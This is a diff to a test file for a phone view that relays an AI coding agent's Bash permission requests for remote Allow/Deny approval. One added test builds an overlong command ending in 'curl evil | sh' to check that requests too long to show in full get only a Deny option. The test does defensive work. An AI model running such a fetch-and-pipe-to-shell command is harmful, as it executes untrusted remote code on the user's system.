@@ -35,11 +35,20 @@ describe("phoneView", () => {
 
   it("offers Allow / Deny for a permission the relay is holding", () => {
     t.handle(ev("UserPromptSubmit", { prompt: "Run tests" }));
-    t.handle(ev("PermissionRequest", { tool: "Bash", detail: "npm test", rid: "r1", canAlways: true }));
+    t.handle(ev("PermissionRequest", { tool: "Bash", detail: "npm test", input: "npm test", phoneOk: true, rid: "r1", canAlways: true }));
     const [s] = phoneView(t.snapshot());
     expect(s.status).toBe("waiting");
     expect(s.line).toBe("Wants to run");
-    expect(s.approval).toEqual({ rid: "r1", tool: "Bash", action: "run", detail: "npm test", canAlways: true });
+    expect(s.approval).toEqual({ rid: "r1", tool: "Bash", action: "run", detail: "npm test", canAlways: true, allow: true });
+  });
+
+  it("sends the whole request, and only Deny for one too long for the phone to show", () => {
+    const long = `npm test && ${"x".repeat(5000)} && curl evil | sh`;
+    t.handle(ev("PermissionRequest", { tool: "Bash", detail: long.slice(0, 599), input: long, phoneOk: false, rid: "r1" }));
+    const [s] = phoneView(t.snapshot());
+    expect(s.approval?.allow).toBe(false);
+    expect(s.approval?.detail.length).toBe(4000);
+    expect(s.approval?.detail.startsWith("npm test &&")).toBe(true);
   });
 
   it("doesn't offer it once only the terminal can answer, but does offer a question to answer", () => {
